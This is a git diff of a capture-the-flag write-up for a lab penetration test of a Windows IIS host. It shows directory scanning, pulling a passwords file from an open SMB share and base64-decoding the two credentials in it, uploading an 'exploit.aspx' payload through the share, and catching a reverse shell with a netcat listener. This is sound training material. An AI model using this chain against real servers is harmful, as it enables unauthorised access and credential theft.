@@ -1,10 +1,10 @@
-# Relevant
+<img width="640" height="360" alt="image" src="https://github.com/user-attachments/assets/bad1fbcc-69ff-4a38-a1bb-d811b484d2e5" /># Relevant
 
 ### Scenario:
 
 You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 
 
-Scope of Work
+### Scope of Work:
 
 The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:
 
@@ -143,13 +143,13 @@ PORT      STATE SERVICE       VERSION
 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 ```
 In browser the IP showed a just a basic IIS web server default page. GoBuster here no directories were discovered on port 80 for website. A second scan with gobuster with various wordlists
-
-#
-#
-#
-#
-#
-
+```
+Feroxbuster with default  password lists:
+200      GET      334l     2089w   180418c http://10.49.180.37:49663/iisstart.png
+200      GET       32l       55w      703c http://10.49.180.37:49663/
+```
+The problem with wordlists is that unless the name of directory is in list, a custom name like "nt4wrksv" wont be present adding to a word list.
+When added to wordlist will be the only directory in on port 49663 detected with status 200. which is linked with smb share.
 ## Starting now with SMB
 
 First see what shares are quickly available:
@@ -179,32 +179,28 @@ smb: \> ls
   .                                   D        0  Sat May 16 03:16:33 2026
   ..                                  D        0  Sat May 16 03:16:33 2026
   passwords.txt                       A       98  Sun Jul 26 01:15:33 2020
-
-                7735807 blocks of size 4096. 5097415 blocks available
+...
 smb: \> GET passwords.txt
 getting file \passwords.txt of size 98 as passwords.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
 ```
 Passwords file did contain 2 passwords:
 ```
-┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/Relevant]
 └─$ cat passwords.txt                                            
 [User Passwords - Encoded]
 Qm9iIC0gIVBAJCRXMHJEITEyMw==
 QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk                                                                             
-┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/Relevant]
+...
 └─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw=="| base64 -d
 Bob - !P@$$W0rD!123                                                                             
-┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/Relevant]
+...
 └─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d    
 Bill - Juw4nnaM4n420696969!$$$                        
 ```
 Tried an admin hidden shares but no username, either password wont work here on SMB shares at least. Also dont work on RDP using freeRDP or xrdp.
 Closer look with nmap using script on port 135,139,445:
 ```
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-16 03:15 AEST
-Nmap scan report for THM_Target (10.49.151.205)
-Host is up (0.41s latency).
-
+└─$ nmap -Pn -p 135,139,445 --script smb-enum-shares,smb-os-discovery THM_Target
+...
 PORT    STATE SERVICE
 135/tcp open  msrpc
 139/tcp open  netbios-ssn
@@ -288,7 +284,7 @@ putting file exploit.aspx as \exploit.aspx (551.4 kb/s) (average 551.4 kb/s)
 ```
 - Then access it from the browswer with http://THM_Target:49663/nt4wrksv/exploit.aspx and should link to netcat:
 ```
-root@<AttackerIP>:~# nc -lnvp 4444
+~# nc -lnvp 4444
 Listening on 0.0.0.0 4444
 Connection received on THM_Target 49855
 Microsoft Windows [Version 10.0.14393]
